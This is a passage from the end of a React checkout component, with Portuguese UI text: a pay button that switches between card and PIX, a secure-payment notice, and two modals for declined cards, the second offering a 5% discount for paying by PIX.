                else setPaymentMethod("pix");
              }}
              disabled={pixLoading || finalizingPayment}
              className="w-full tiktok-btn-primary h-[48px] rounded-full text-[15px] font-bold disabled:opacity-60 flex items-center justify-center gap-2 active:scale-[0.98] transition-transform"
            >
              {(pixLoading || finalizingPayment) && <Clock className="w-4 h-4 animate-spin" />}
              {pixLoading ? "Gerando PIX..." : finalizingPayment ? "Processando..." : paymentMethod === "credit" ? "Pagar com Cartão" : "Pagar com PIX"}
            </button>
          </div>
          <div className="flex items-center justify-center gap-1.5 py-1.5">
            <Lock className="w-3 h-3 text-muted-foreground" />
            <span className="text-[9px] text-muted-foreground">Pagamento seguro e criptografado</span>
          </div>
          <div className="h-[env(safe-area-inset-bottom,0px)]" />
        </div>
      </div>

      {pixPopup}
      {addressModal}

      {/* Payment error */}
      {showPaymentError && (
        <div className="fixed inset-0 z-[200] bg-foreground/60 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-card rounded-2xl p-5 max-w-[320px] w-full text-center animate-in zoom-in-95 duration-200">
            <div className="w-12 h-12 rounded-full bg-destructive/10 flex items-center justify-center mx-auto mb-3">
              <X className="w-6 h-6 text-destructive" />
            </div>
            <h3 className="text-[15px] font-bold text-foreground mb-1">Pagamento recusado</h3>
            <p className="text-[12px] text-muted-foreground mb-4">Cartão recusado pela operadora. Tente outro cartão ou PIX.</p>
            <button onClick={() => setShowPaymentError(false)} className="w-full tiktok-btn-primary h-11 rounded-full text-[13px] font-bold">
              Tentar novamente
            </button>
          </div>
        </div>
      )}

      {showRetryError && (
        <div className="fixed inset-0 z-[200] bg-foreground/60 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-card rounded-2xl p-5 max-w-[320px] w-full text-center animate-in zoom-in-95 duration-200">
            <div className="w-12 h-12 rounded-full bg-destructive/10 flex items-center justify-center mx-auto mb-3">
              <X className="w-6 h-6 text-destructive" />
            </div>
            <h3 className="text-[15px] font-bold text-foreground mb-1">Cartão recusado novamente</h3>
            <p className="text-[12px] text-muted-foreground mb-4">Use PIX para garantir sua compra com 5% de desconto.</p>
            <button onClick={() => { setShowRetryError(false); setPaymentMethod("pix"); }} className="w-full tiktok-btn-primary h-11 rounded-full text-[13px] font-bold mb-2">
              Pagar com PIX (5% OFF)
            </button>
            <button onClick={() => setShowRetryError(false)} className="w-full h-10 rounded-full text-[12px] text-muted-foreground">
              Tentar outro cartão
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default Checkout;
